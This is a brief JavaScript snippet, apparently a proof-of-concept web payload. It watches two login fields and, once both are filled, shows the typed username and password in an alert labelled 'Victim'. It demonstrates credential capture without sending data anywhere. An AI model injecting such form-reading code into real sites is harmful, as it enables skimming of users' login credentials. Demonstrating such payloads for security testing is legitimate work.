
let isFilled = false;

 function checkInputs() {
    const input1 = document.getElementsByName('fofi_b61')[0];
    const input2 = document.getElementsByName('fofi_b71')[0];

    if (input1.value && input2.value) {
      if (!isFilled) {
        isFilled = true; 
        setTimeout(function() {
          alert('Victim username: '+document.getElementsByName('fofi_b61')[0].value+'\n\nVictim password: '+document.getElementsByName('fofi_b71')[0].value);
         
        }, 3000); 
      }
    }
  }

  
  window.onload = checkInputs;


  document.getElementsByName('fofi_b61')[0].addEventListener('input', checkInputs);
  document.getElementsByName('fofi_b71')[0].addEventListener('input', checkInputs);
